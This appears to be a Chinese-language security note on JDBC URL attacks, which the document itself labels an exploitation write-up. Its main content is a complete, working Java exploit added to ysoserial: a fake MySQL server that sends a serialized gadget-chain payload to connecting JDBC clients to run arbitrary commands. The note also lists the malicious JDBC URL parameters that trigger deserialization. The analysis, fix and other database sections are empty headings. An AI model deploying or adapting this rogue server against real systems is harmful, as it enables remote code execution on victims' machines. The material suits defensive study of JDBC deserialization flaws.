### 漏洞简介

* **简述**：
  * JDBC定义了一个叫`java.sql.Driver`的接口类负责实现对数据库的连接，所有的数据库驱动包都必须实现这个接口才能够完成数据库的连接操作。`java.sql.DriverManager.getConnection(xxx)`其实就是间接的调用了`java.sql.Driver`类的`connect`方法实现数据库连接的。数据库连接成功后会返回一个叫做`java.sql.Connection`的数据库连接对象，一切对数据库的查询操作都将依赖于这个`Connection`对象
  * 在进行数据库连接的时候会指定数据库的URL和连接配置`Connection con = DriverManager.getConnection("jdbc:mysql://localhost:3306/test","root", "root");` 如果JDBC URL的参数被攻击者控制，可以让其指向恶意SQL服务器，根据不同的数据库Driver可以造成反序列化、文件读取等不同的攻击

### Mysql JDBC

* **产生原因**
  * DBC连接MySQL服务器时，会默认执行几个内置的SQL语句，查询的结果集会在Mysql客户端调用ObjectInputStream#readObject进行反序列化
* **影响版本**

#### 漏洞利用

* ysoserial中增加如下利用代码

```java
package ysoserial.exploit;

/*
* mysql jdbc反序列化服务端
* java -cp ysoserial-all.jar ysoserial.exploit.JDBCAttackMysqlServer 3306 CommonsCollections6 "calc.exe"
* */

import ysoserial.Serializer;
import ysoserial.payloads.CommonsCollections1;
import ysoserial.payloads.ObjectPayload;

import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;

public class JDBCAttackMysqlServer {
    private static final String GREETING_DATA = "4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400";
    private static final String RESPONSE_OK_DATA = "0700000200000002000000";

    public static void main(String[] args) throws Exception {
        String host = "0.0.0.0";
        int port = Integer.parseInt(args[0]);
        String gadget = CommonsCollections1.class.getPackage().getName() +  "." +  args[1].trim();
        String command = args[2];

        String ser = bytesToHex(getPayload(gadget,command));

        fakeServer(host,port,ser);

    }

    private static void fakeServer(String host,int port,String ser){
        try (ServerSocket serverSocket = new ServerSocket(port, 50, InetAddress.getByName(host))) {
            System.out.println("Start fake MySQL server listening on " + host + ":" + port);

            while (true) {
                try (Socket clientSocket = serverSocket.accept()) {
                    System.out.println("Connection come from " + clientSocket.getInetAddress() + ":" + clientSocket.getPort());

                    // Send greeting data
                    sendData(clientSocket, GREETING_DATA);

                    while (true) {
                        // Login simulation: Client sends request login, server responds with OK
                        receiveData(clientSocket);
                        sendData(clientSocket, RESPONSE_OK_DATA);

                        // Other processes
                        String data = receiveData(clientSocket);
                        if (data.contains("session.auto_increment_increment")) {
                            String payload = "01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000";
                            sendData(clientSocket, payload);
                            data = receiveData(clientSocket);
                        } else if (data.contains("SHOW WARNINGS")) {
                            String payload = "01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000";
                            sendData(clientSocket, payload);
                            data = receiveData(clientSocket);
                        }
                        if (data.contains("SET NAMES")) {
                            sendData(clientSocket, RESPONSE_OK_DATA);
                            data = receiveData(clientSocket);
                        }
                        if (data.contains("SET character_set_results")) {
                            sendData(clientSocket, RESPONSE_OK_DATA);
                            data = receiveData(clientSocket);
                        }
                        if (data.contains("SHOW SESSION STATUS")) {
                            StringBuilder mysqlDatafinal = new StringBuilder();
                            String mysqlData = "0100000102";
                            mysqlData += "1a000002036465660001630163016301630c3f00ffff0000fc9000000000";
                            mysqlData += "1a000003036465660001630163016301630c3f00ffff0000fc9000000000";

                            // Get payload
                            String payloadContent = ser;
                            if (payloadContent != null) {
                                // 计算 payload 长度并转为十六进制格式
                                String payloadLength = Integer.toHexString(payloadContent.length() / 2); // Python中的 //2 在Java中是使用除法
                                payloadLength = String.format("%4s", payloadLength).replace(' ', '0');  // 补充0，保持四位长度
                                String payloadLengthHex = payloadLength.substring(2, 4) + payloadLength.substring(0, 2); // 反转顺序

                                // 计算数据包总长度
                                int totalLength = payloadContent.length() / 2 + 4;
                                String dataLen = Integer.toHexString(totalLength);
                                dataLen = String.format("%6s", dataLen).replace(' ', '0'); // 补充0，保持六位长度
                                String dataLenHex = dataLen.substring(4, 6) + dataLen.substring(2, 4) + dataLen.substring(0, 2); // 反转顺序

                                // 构造最终的 MySQL 数据包
                                mysqlDatafinal.append(mysqlData).append(dataLenHex)
                                    .append("04")
                                    .append("fbfc")
                                    .append(payloadLengthHex)
                                    .append(payloadContent)  // 这里应该是 payload 的内容，假设它是一个十六进制字符串
                                    .append("07000005fe000022000100");
                            }
                            String mysqlstring = mysqlDatafinal.toString();
                            sendData(clientSocket, mysqlstring);
                            data = receiveData(clientSocket);
                        }
                        if (data.contains("SHOW WARNINGS")) {
                            String payload = "01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000";
                            sendData(clientSocket, payload);
                        }
                        break;
                    }
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    // Receive data from client
    private static String receiveData(Socket socket) throws IOException {
        byte[] buffer = new byte[1024];
        InputStream inputStream = socket.getInputStream();
        int bytesRead = inputStream.read(buffer);
        String asciiString = new String(Arrays.copyOf(buffer, bytesRead), StandardCharsets.US_ASCII);
        String data =  asciiString;
        System.out.println("[*] Receiving the package: " + data);
        return data;
    }

    // Send data to client
    private static void sendData(Socket socket, String data) throws IOException {
        System.out.println("[*] Sending the package: " + data);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(hexToBytes(data));
        outputStream.flush();
    }

    // Convert byte array to hexadecimal string
    private static String bytesToHex(byte[] bytes) {
        StringBuilder hexString = new StringBuilder();
        for (byte b : bytes) {
            hexString.append(String.format("%02x", b));
        }
        return hexString.toString();
    }

    // Convert hexadecimal string to byte array
    private static byte[] hexToBytes(String hex) {
        int len = hex.length();
        byte[] bytes = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            bytes[i / 2] = (byte) Integer.parseInt(hex.substring(i, i + 2), 16);
        }
        return bytes;
    }


    private static byte[] getPayload(String gadget, String command) throws Exception {
        final Class<? extends ObjectPayload> payloadClass = (Class<? extends ObjectPayload>) Class.forName(gadget);
        ObjectPayload payloadObj = payloadClass.newInstance();
        Object payload = payloadObj.getObject(command);
        byte[] ser = Serializer.serialize(payload);
        return ser;
    }
}


```

* jdbc设置

```url
jdbc:mysql://ip:port/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
```



#### 漏洞分析

#### 修复

### PostgreSQL JDBC

### H2database

